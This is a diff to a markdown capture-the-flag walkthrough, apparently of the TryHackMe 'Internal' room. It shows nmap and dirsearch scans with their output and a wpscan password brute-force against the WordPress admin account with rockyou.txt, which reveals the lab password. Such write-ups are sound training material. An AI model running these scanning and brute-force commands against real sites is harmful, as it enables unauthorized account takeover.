@@ -4,7 +4,7 @@
 
 ## Enumerating And Scanning:
 - Nmap scan to discover open ports: `nmap -sV -sC -O -p 21,22,80,8080,139,143,445,443,25,110 internal.thm`
-- **Nmap Scan Results:**
+- **nmap Scan Results:**
 ```
 PORT     STATE  SERVICE      VERSION
 21/tcp   closed ftp
@@ -35,7 +35,7 @@ Nmap done: 1 IP address (1 host up) scanned in 31.00 seconds
 - Also note of `8080/tcp closed http-proxy`
 
 - dirsearch to search for hidden directories and files on the web server: `dirsearch -u internal.thm -x 400,500 -r -t 100`
-- **Dirsearch Scan Results:**
+- **dirsearch Scan Results:**
 ```
 [14:08:56] Starting: 
 [14:09:03] 403 -  277B  - /.ht_wsr.txt                                      
@@ -70,9 +70,31 @@ Nmap done: 1 IP address (1 host up) scanned in 31.00 seconds
                                                                              
 Task Completed
 ```
-- Under the directory `http://internal.thm/wordpress/wp-login.php` we have a login page for `wordpress`
+- Under the directory `http://internal.thm/blog/wp-login.php` we have a login page for `wordpress`
 
 ![alt text](images/internal_WP-LOGIN-SS.png)
 - Basic enumeration on the page with the login credentials using `admin:admin` can see that there is a user called admin
 
 ![alt text](images/WP-ADMIN-SS.png)
+
+- With this information lets try and run a `wpscan` to find the password
+- `wpscan --url http://internal.thm/blog/wp-login.php --usernames admin --passwords rockyou.txt -t 100`
+- **wpscan Scan Results:**
+'''
+[!] Valid Combinations Found:
+ | Username: admin, Password: my2boys
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Tue Nov 19 14:42:53 2024
+[+] Requests Done: 4219
+[+] Cached Requests: 4
+[+] Data Sent: 1.487 MB
+[+] Data Received: 20.636 MB
+[+] Memory used: 320.254 MB
+[+] Elapsed time: 00:02:17
+'''
+'''
+We are able to find that the login credentials are **Username: admin, Password: my2boys**
+'''
